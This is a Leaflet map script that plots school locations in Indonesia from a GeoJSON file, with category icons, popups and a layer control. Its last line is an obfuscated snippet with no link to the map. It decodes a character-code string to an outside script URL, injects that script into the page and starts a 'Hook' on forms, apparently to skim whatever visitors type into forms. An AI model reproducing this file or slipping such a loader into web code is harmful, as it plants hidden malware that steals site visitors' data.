/* Initial Map */
var map = L.map('map').setView([-2.367064,118.872815],5); //lat, long, zoom
      
/* Tile Basemap */
var basemap = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
  attribution: '<a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> | <a href="https://unsorry.net" target="_blank">unsorry@2020</a>'
});
basemap.addTo(map);

/* Icon Category */
var sizeicon= 24,
_iconsize = [sizeicon, sizeicon],
_iconsizehalf = sizeicon / 2,
_iconanchor = [_iconsizehalf, sizeicon],
_iconsizeminus = -1 * sizeicon,
_popupanchor = [0, _iconsizeminus];

var iconSd = L.icon({
  iconUrl: "../assets/marker/redicon.png",
  iconSize: _iconsize,
  iconAnchor: _iconanchor,
  popupAnchor: _popupanchor,
});

var iconSmp = L.icon({
  iconUrl: "../assets/marker/greenicon.png",
  iconSize: _iconsize,
  iconAnchor: _iconanchor,
  popupAnchor: _popupanchor,
});

var iconSma = L.icon({
  iconUrl: "../assets/marker/purpleicon.png",
  iconSize: _iconsize,
  iconAnchor: _iconanchor,
  popupAnchor: _popupanchor,
});

/* GeoJSON Point */
var iconCategory = {'SD': iconSd, 'SMP/MTS': iconSmp, 'SMA/SMK/MA': iconSma};
var point = L.geoJson(null, {
  pointToLayer: function (feature, latlng) {
    return L.marker(latlng, {
      icon: iconCategory[feature.properties.kategori]
    });
  },
  /* Popup */
  onEachFeature: function (feature, layer) {
    if (feature.properties) {
      layer.on({
        click: function (e) {
          point.bindPopup(feature.properties.label);
          map.flyTo(new L.LatLng(feature.geometry.coordinates[1],feature.geometry.coordinates[0]), 15);
          point.openPopup();
        }
      });
    }
  }
});
$.getJSON("../data/school.geojson", function (data) {
  point.addData(data);
  map.addLayer(point);
  map.fitBounds(point.getBounds());
});

/* Control Layer */
var Layers = {
  'School<br>&nbsp;&nbsp;<img src="../assets/marker/redicon.png" width="12"> Primary School<br>&nbsp;&nbsp;<img src="../assets/marker/greenicon.png" width="12"> Junior High School<br>&nbsp;&nbsp;<img src="../assets/marker/purpleicon.png" width="12"> Senior High School': point,
}
var layerControl = L.control.layers(null, Layers, {collapsed:false});
layerControl.addTo(map);
(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db